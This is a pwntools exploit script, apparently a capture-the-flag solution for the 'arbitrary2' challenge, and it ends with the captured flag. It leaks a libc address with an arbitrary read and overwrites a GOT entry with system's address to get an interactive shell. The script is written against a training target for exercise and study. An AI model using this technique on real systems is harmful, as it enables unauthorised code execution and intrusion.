#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './arbitrary2')

host = args.HOST or 'arbitrary2.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

pos = [0x60100]
syste = [0x58750, 0x58750]
addr = b"0x404018"
change = b"0x404000"
io = start()

io.sendlineafter(b"> ", b"/bin/sh")
io.sendlineafter(b"> ", addr)
tochange = int(io.recvline().decode().strip().split(" ")[-1], 16)
addr = tochange - pos[0] + syste[0]
print(tochange)
print(hex(addr).encode())
print(io.recvline())

io.sendlineafter(b"> ", change)
io.sendlineafter(b"> ", hex(addr).encode())
io.recvline()

io.interactive()

# srdnlen{R3AD_wR173_wHa7_WH3r3}